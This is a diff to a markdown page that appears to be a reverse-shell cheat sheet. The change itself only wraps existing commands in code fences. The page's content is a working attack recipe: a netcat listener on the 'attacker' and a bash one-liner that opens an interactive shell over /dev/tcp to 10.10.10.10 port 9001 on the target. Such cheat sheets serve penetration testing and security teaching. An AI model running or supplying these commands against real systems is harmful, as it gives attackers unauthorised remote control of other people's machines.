@@ -31,16 +31,18 @@ cover:
 
 ---
 ## Start a listener on attacker:
-
+```
     nc -lp 9001
     # ip=10.10.10.10
     # port=9001
+```
 
 ## Run a shell on target:
 
 * bash
-
+```
     bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
+```
 
 ## References
 
